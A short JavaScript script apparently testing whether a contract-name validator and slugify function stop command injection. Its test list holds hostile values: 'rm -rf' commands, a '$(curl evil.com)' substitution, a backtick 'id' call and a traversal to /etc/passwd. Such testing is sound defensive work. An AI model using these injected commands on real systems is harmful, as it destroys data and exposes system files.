// Contract name injection analysis
const HTTP_METHOD_PATTERN = /^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(.+)$/i;
const HTTP_CONTRACT_NAME_PATTERN = /^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+\S+/i;

function slugify(value) {
  const normalized = String(value ?? "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
  const truncated = normalized.length > 48
    ? normalized.slice(0, 48).replace(/-[^-]*$/, "")
    : normalized;
  return truncated || "blueprint";
}

const contractNames = [
  'POST /auth; rm -rf /tmp',
  'POST /auth\nrm -rf /',
  'POST /auth$(curl evil.com)',
  'POST /auth`id`',
  'GET /users/../../../etc/passwd',
];

console.log('=== Contract name injection analysis ===');
for (const name of contractNames) {
  const validatorPasses = HTTP_CONTRACT_NAME_PATTERN.test(name);
  const match = name.match(HTTP_METHOD_PATTERN);
  const slugged = slugify(name);
  const urlPath = match ? match[2].trim() : null;
  console.log(`\nContract: ${JSON.stringify(name)}`);
  console.log(`  Validator blocks? ${!validatorPasses} (passes=${validatorPasses})`);
  console.log(`  Slugified filename: ${slugged}`);
  console.log(`  URL path in OpenAPI: ${urlPath ? JSON.stringify(urlPath) : 'N/A'}`);
}
